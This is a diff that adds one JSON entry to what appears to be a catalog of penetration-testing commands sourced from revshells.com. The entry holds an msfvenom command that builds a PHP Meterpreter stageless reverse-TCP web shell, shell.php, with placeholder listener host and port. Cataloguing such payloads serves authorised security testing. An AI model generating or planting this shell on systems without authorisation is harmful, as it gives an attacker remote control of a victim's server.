@@ -1,0 +1,33 @@
+{
+  "id": "rsg-msfvenom-php-meterpreter-stageless-reverse-tcp",
+  "name": "RSG · MSFVenom · PHP Meterpreter Stageless Reverse TCP",
+  "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST=<lhost> LPORT=<lport> -f raw -o shell.php",
+  "description": "M S F Venom payload — PHP Meterpreter Stageless Reverse TCP (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "windows",
+    "linux",
+    "meterpreter",
+    "stageless",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/PHP Meterpreter Stageless Reverse TCP/96",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
